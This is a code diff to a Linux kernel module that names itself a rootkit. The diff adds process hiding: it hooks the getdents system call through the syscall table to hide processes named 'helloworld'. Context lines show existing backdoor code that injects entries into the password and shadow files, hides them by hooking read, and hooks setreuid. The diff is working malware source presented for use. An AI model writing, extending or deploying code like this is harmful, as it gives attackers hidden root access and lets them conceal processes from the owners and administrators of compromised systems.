@@ -24,7 +24,6 @@ typedef unsigned long psize;
 
 asmlinkage int (*o_read)(int fd, void* buf, size_t count);
 
-// "table" will be replaced with the system call table address found by grep in compile.sh
 psize *sys_call_table;
 
 asmlinkage long (*o_setreuid) (uid_t ruid, uid_t reuid);
@@ -57,7 +56,6 @@ psize **find(void) {
 		if (sctable[__NR_close] == (psize *) sys_close) return &sctable[0];
 		i += sizeof(void *);
 	}
-
 	return NULL;
 }
 
@@ -192,7 +190,7 @@ int delete_text_from_buffer(char* text, char* buf, int bytes_read) {
 
 	// overwrite user's buffer
 	copy_to_user(buf + offset, end_of_buffer, end_of_buffer_size + 1); // the + 1 is to write a null byte at the end
-		
+
 	// cleanup and return
 	kfree(k_buf);
 	return new_size;
@@ -237,12 +235,108 @@ asmlinkage int backdoor_read(int fd, void* buf, size_t count) {
 
 	// check if we need to hide anything
 	if (strcmp(pathname, PASSWD_PATH) == 0) bytes_read = delete_text_from_buffer(PASSWD_STRING, buf, bytes_read);
-	if (strcmp(pathname, SHADOW_PATH) == 0) bytes_read = delete_text_from_buffer(SHADOW_STRING, buf, bytes_read); 
+	if (strcmp(pathname, SHADOW_PATH) == 0) bytes_read = delete_text_from_buffer(SHADOW_STRING, buf, bytes_read);
 
 	// cleanup
 	free_page((unsigned long)tmp);
 	return bytes_read;
 }
+
+//	========================
+//	Process Hiding
+//	========================
+#define HIDDEN_PROCESS "helloworld"
+
+//helper function for getting process name from a PID
+void get_name_from_pid(char* pid, char* buff) {
+
+	//declare variable
+	struct file *fp;
+	mm_segment_t fs;
+	char *proc = "/proc/";
+	char *cmdline = "/comm";
+	char *buf = (char*) kcalloc(1, 16, GFP_KERNEL);
+
+	//create the filepath to the process name
+	strcpy(buf, proc);
+	strcat(buf, pid);
+	strcat(buf, cmdline);
+	//printk("%s\n", buf);
+
+	//open the filepath if possible
+	fp = filp_open(buf,O_RDONLY,0);
+	if(IS_ERR(fp))
+	{
+		//printk("open file error\n");
+		kfree(buf);
+		return;
+	}
+	fs = get_fs();
+	set_fs(KERNEL_DS);
+
+	//read the process name into the buffer
+	int n = vfs_read(fp, buff, 16, &fp->f_pos);
+	//printk("return %d buff %s\n", n, buff);
+
+	//cleanup
+	buff[n] = '\0';
+	filp_close(fp, NULL);
+	set_fs(fs);
+	kfree(buf);
+}
+
+//wrap the getdents system call to exclude our processes
+asmlinkage int (*o_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage int backdoor_getdents (unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+	struct linux_dirent {
+	    long           d_ino;
+	    off_t          d_off;
+	    unsigned short d_reclen;
+	    char           d_name[];
+	};
+	struct linux_dirent *kdirp,*kdirp2;
+  long value,tlen;
+  long kdirplength = 0;
+
+	//run o_getdents
+	value = (*o_getdents) (fd, dirp, count);
+  tlen = value;
+
+	//linux dirents for the current dirent being analyzed and for copying into the original
+	kdirp = (struct linux_dirent *) kmalloc(tlen, GFP_KERNEL);
+  kdirp2 = kdirp;
+  copy_from_user(kdirp, dirp, tlen);
+
+	//iterate though what o_getdents read
+	while(tlen > 0)
+  {
+    kdirplength = kdirp->d_reclen;
+    tlen = tlen - kdirplength;
+		char* pidname = kcalloc(1, 16, GFP_KERNEL);
+		if (kdirp->d_name != NULL)
+		get_name_from_pid(kdirp->d_name, pidname);
+
+		//check if the process we want to hide is in the dirent being analyzed
+		if(strstr(pidname, HIDDEN_PROCESS) != NULL)
+    {
+			//if so, remove from the dirp so it cannot be read from
+      memmove(kdirp, (char *) kdirp + kdirp->d_reclen, tlen);
+      value = value - kdirplength;
+      //printk(KERN_INFO "hide successful.\n");
+    }
+    else if(tlen)
+		{
+			//else, go to the next dirent
+      kdirp = (struct linux_dirent *) ((char *)kdirp + kdirp->d_reclen);
+		}
+		kfree(pidname);
+  }
+	//copy our modified dirp to the original and return
+  copy_to_user(dirp, kdirp2, value);
+  kfree(kdirp2);
+  return value;
+}
+
 
 // init and remove the backdoor stuff
 
@@ -250,7 +344,7 @@ void add_backdoor(void) {
 
 	add_text_to_file(PASSWD_STRING, PASSWD_PATH);
 	add_text_to_file(SHADOW_STRING, SHADOW_PATH);
-	
+
 	write_cr0(read_cr0() & (~ 0x10000));
 	o_read = (void *) xchg(&sys_call_table[__NR_read], backdoor_read);
 	write_cr0(read_cr0() | 0x10000);
@@ -280,6 +374,22 @@ void remove_setreuid(void) {
 	write_cr0(read_cr0() | 0x10000);
 }
 
+void add_getdents(){
+
+	write_cr0(read_cr0() & (~ 0x10000));
+	o_getdents = (void*) xchg(&sys_call_table[__NR_getdents], backdoor_getdents);
+	write_cr0(read_cr0() | 0x10000);
+}
+
+void remove_getdents(){
+
+	write_cr0(read_cr0() & (~ 0x10000));
+	xchg(&sys_call_table[__NR_getdents], o_getdents);
+	write_cr0(read_cr0() | 0x10000);
+}
+
+
+// ==========================
 // load and unload the module
 // ==========================
 
@@ -293,8 +403,9 @@ int init_module(void) {
 
 	add_backdoor();
 	add_setreuid();
-    
-	printk(KERN_INFO "rootkit loaded\n");	
+	add_getdents();
+
+	printk(KERN_INFO "rootkit loaded\n");
 	return 0;
 }
 
@@ -302,6 +413,7 @@ void cleanup_module(void) {
 
 	remove_backdoor();
 	remove_setreuid();
+	remove_getdents();
 
 	printk(KERN_INFO "rootkit unloaded\n");
 }
